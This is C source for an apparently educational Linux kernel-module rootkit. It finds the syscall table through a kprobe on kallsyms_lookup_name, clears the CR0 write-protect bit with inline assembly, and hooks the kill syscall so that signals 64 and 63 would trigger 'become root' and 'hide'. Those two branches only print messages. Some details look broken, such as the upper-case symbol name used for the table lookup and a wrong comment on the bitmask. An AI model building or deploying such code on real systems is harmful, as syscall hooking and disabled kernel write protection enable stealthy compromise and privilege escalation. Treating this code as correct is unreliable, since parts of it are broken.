#include <linux/init.h>     //used for things like __init and __exit
#include <linux/module.h>   //load the module into kernel
#include <linux/kernel.h>    //kernel functions
#include <linux/kallsyms.h>     //capture this so I know where to grab addresses from
#include <linux/kprobes.h>      //needed for kallsyms_lookup on linux kernel 5.7+
#include <linux/unistd.h>       //defines syscall numbers
#include <linux/version.h>      // Linux kernel versions
#include <asm/paravirt.h>       //needed to read the cr0 register
#include <linux/dirent.h>       //contains ptregs structs and directory syscall

//for use with later if rootkit is modified to work with <5.7 kern linux
#define PTREGS_SYSCALL_STUB 1

/*
syscalls start with asmlinkage
function pointer
*/
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);

/* 
ptregs is a structure given back to us with the syscall_64 table
it contains all registers put on the stack.
idk what ptregs stands for
making global
*/
static ptregs_t ORIG_KILL;

//making global SYS_CALL_TABLE variable because I'm messing up passing it around.
unsigned long* SYS_CALL_TABLE;

enum signals {
    SIGSUPER = 64,  //become root
    SIGINVIS = 63   //hide
};

//modifying kprobe. filling out name here
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

//store original SYS_CALL_TABLE so I dont mess it up
static int store(void)
{
    //keeping original value
    ORIG_KILL = (ptregs_t)SYS_CALL_TABLE[__NR_kill];
    printk(KERN_INFO "ORIG_KILL table entry successfully stored\n");
    return 0;
}

static int cleanup(void)
{
    //putting back original value from store function
    SYS_CALL_TABLE[__NR_kill] = (unsigned long)ORIG_KILL;
    printk(KERN_INFO "Syscalltable reverted back to original value\n");
    return 0;
}

static asmlinkage long hacked_kill(const struct pt_regs *regs)
{
    //grab register for syscall from https://syscalls64.paolostivanin.com
    //this is pulling the sig out from the kill command
    int sig = regs->si;
    
    //created enum to elevate privs
    if(sig == SIGSUPER)
    {
        printk(KERN_INFO "Signal: %d == SIGSUPER: %d, going to become root\n", sig, SIGSUPER);
        return 0;
    }
    else if (sig == SIGINVIS)
    {
        printk(KERN_INFO "Signal: %d == SIGINVIS: %d, going to hide itself\n", sig, SIGINVIS);
        return 0;
    }
    return ORIG_KILL(regs);
}

static int hook(void)
{
    //holding a pointer to the hacked_kill function address
    //gotta typecast as SYS_CALL_TABLE is holding unsigned longs
    SYS_CALL_TABLE[__NR_kill] = (unsigned long)&hacked_kill;
    return 0;
}


/*
CR0 is x86 control register. Now write protection to stop rootkits from using write_cr0.
But we can make our own version to still be able to do it.
Going to create three functions to manipulate cr0
*/
static inline void write_cr0_force(unsigned long val)
{
    unsigned long __force_order;

    //some asm to perform what the older, unprotected write cr0 would do
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));    
}
// below should disable the write protection
static void unprotect_memory(void)
{
    // sets bits from 0x10000 to 0x01111
    write_cr0_force(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "memory is unprotected\n");
}
// below should enable write protection
static void protect_memory(void)
{
    write_cr0_force(read_cr0() | (0x10000));
    printk(KERN_INFO "memory is protected\n");
}

//when the rootkit gets closed
static void __exit mod_exit(void)
{
    //print to dmesg
    printk(KERN_INFO "rootkit exited\n");

    unprotect_memory();

    //revert back the syscalltable
    cleanup();

    protect_memory();
    
    return;
}

//mod_init aka main that's user level so kernel level so mod_init
static int __init mod_init(void)
{
    //print to dmesg
    printk(KERN_INFO "rootkit initialized\n");

    //kprobe needed to access table as table is no longer exported in newer linux
    printk(KERN_INFO "registering kprobe..\n");
    if (register_kprobe(&kp) < 0)
    {
        printk("Could not register kprobe\n");
        return 1;
    }
    printk(KERN_INFO "register kprobe success\n");

    //create types to handle data
    typedef unsigned long(*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    //close out kprobe now that i'm done with it    
    unregister_kprobe(&kp);

    SYS_CALL_TABLE = (unsigned long*) kallsyms_lookup_name("SYS_CALL_TABLE");
    if(!SYS_CALL_TABLE)
    {
        printk(KERN_INFO "Sys call table not found.. exiting");
        return 1;
    }
    printk(KERN_INFO "sys call table found\n");

    if(store() != 0)
    {
        printk(KERN_INFO "error happened in store()\n");
        return 1;
    }

    unprotect_memory();

    if(hook() != 0)
    {
        printk(KERN_INFO "error happened in hook()\n");
    }

    protect_memory();

    return 0;
}

//tell it where to go insmod
module_init(mod_init);

//tell it where to go on rmmod
module_exit(mod_exit);

//needed for module build. removed taint dmesg message
MODULE_LICENSE("GPL");  //required by gcc to build
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.0.1");
